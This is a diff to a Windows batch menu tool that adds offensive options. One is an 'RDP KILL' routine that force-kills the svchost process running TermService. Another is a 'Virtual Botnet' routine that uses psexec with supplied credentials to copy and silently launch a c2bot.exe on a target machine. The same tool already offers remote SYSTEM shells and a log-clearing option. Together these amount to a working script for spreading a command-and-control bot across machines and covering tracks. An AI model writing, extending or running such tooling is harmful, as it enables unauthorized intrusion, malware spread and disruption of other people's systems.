@@ -51,7 +51,10 @@ echo    [8] - REMOTE DESKTOP (MSTSC)               [17] - ARP ADDRESS SCAN
 echo.
 echo    [9] - REMOTE DESKTOP HELP                  [18] - PORT SCANNER (PowerShell)
 echo.
-echo                               [19] - LOG CLEAR
+echo    [19] - LOG CLEAR                           [20] - RDP KILL                            
+echo.
+echo    [21] - Virtual Botnet                      [22] -  ADMIN SHARE
+echo.
 echo ________________________________________________________________________________________________________________________
 echo.
 set /p i=Select an option:
@@ -75,6 +78,9 @@ if "%i%"=="16" goto fad
 if "%i%"=="17" goto arp
 if "%i%"=="18" goto scan
 if "%i%"=="19" goto log
+if "%i%"=="20" goto rdpk
+if "%i%"=="21" goto Btn
+if "%i%"=="22" goto adsh
 goto MENU
 
 :FIND
@@ -182,7 +188,10 @@ echo Target IP:
 set /p target_ip=
 echo.
 echo Attempting connection...
-psexec \\%target_ip% -s cmd
+echo give the psexec's adress here
+set /p adr2=
+set adr2=%adr2:"=%
+"%adr2%" \\%target_ip% -s cmd
 pause
 goto MENU
 
@@ -236,6 +245,14 @@ if exist port_scan_log.txt (
 pause
 goto MENU
 
+:rdpk
+cls
+echo [!] RDP Sessions are being terminated...
+taskkill /f /im svchost.exe /fi "services eq TermService"
+echo [+] RDP service killed.
+pause
+goto MENU
+
 :Btn
 cls
 echo === Botnet ===
@@ -248,11 +265,14 @@ set /p pc_user=
 echo password (If it has not password press enter only):
 set /p pc_pass=
 echo.
-give the c2bot.exe's adress here
+echo give the c2bot.exe's adress here
 set /p adr=
 set adr=%adr:"=%
+echo give the psexec's adress here
+set /p adr2=
+set adr2=%adr2:"=%
 echo Access trying
-psexec \\%target_ip% -u %pc_user% -p "%pc_pass%" -d -c "%adr%"
+"%adr2%" \\%target_ip% -u %pc_user% -p "%pc_pass%" -d -c "%adr%"
 pause
 goto MENU
 
